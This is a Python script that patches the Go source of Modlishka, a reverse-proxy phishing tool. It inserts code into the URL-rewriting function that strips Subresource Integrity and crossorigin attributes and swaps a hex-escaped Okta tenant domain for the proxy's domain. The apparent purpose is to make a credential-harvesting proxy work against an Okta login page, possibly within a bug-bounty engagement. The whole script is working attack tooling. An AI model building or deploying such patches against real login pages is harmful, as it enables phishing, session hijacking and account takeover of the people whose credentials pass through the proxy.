#!/usr/bin/env python3
"""Patch modlishka's PatchURL to:
1. Strip SRI integrity and crossorigin attributes
2. Replace \\x2D encoded domain (JS hex escapes for hyphens)
"""
import shutil

SRC = "/opt/Modlishka/core/proxy.go"
BAK = SRC + ".bak"

# Restore from backup
shutil.copy2(BAK, SRC)
print(f"Restored {SRC} from backup")

with open(SRC) as f:
    lines = f.readlines()

# 1. Add "regexp" import after "bytes" import
new_lines = []
regexp_added = False
for line in lines:
    new_lines.append(line)
    if '"bytes"' in line and not regexp_added:
        new_lines.append('\t"regexp"\n')
        regexp_added = True
        print("Added regexp import")

# 2. Find the LAST "return buffer" (the one in PatchURL)
last_return_idx = None
for i, line in enumerate(new_lines):
    if line.strip() == "return buffer":
        last_return_idx = i

if last_return_idx is None:
    print("ERROR: Could not find 'return buffer' in PatchURL")
    exit(1)

print(f"Found last 'return buffer' at line {last_return_idx + 1}")

# 3. Insert SRI stripping + hex-encoded domain replacement before that return
patch_lines = [
    '\t// Strip SRI integrity and crossorigin attributes so rewritten CDN assets load\n',
    '\tintegrityRe := regexp.MustCompile(`\\s+integrity="[^"]*"`)\n',
    '\tbuffer = integrityRe.ReplaceAll(buffer, []byte(""))\n',
    '\tcrossoriginRe := regexp.MustCompile(`\\s+crossorigin="[^"]*"`)\n',
    '\tbuffer = crossoriginRe.ReplaceAll(buffer, []byte(""))\n',
    '\n',
    '\t// Replace JS hex-escaped domain (Okta encodes hyphens as \\x2D in inline JS config)\n',
    '\tbuffer = bytes.Replace(buffer, []byte(`bugcrowd\\x2Dpam\\x2D4593.oktapreview.com`), []byte(runtime.ProxyDomain), -1)\n',
    '\n',
]

new_lines = new_lines[:last_return_idx] + patch_lines + new_lines[last_return_idx:]

with open(SRC, "w") as f:
    f.writelines(new_lines)

print(f"Patch applied to {SRC}")
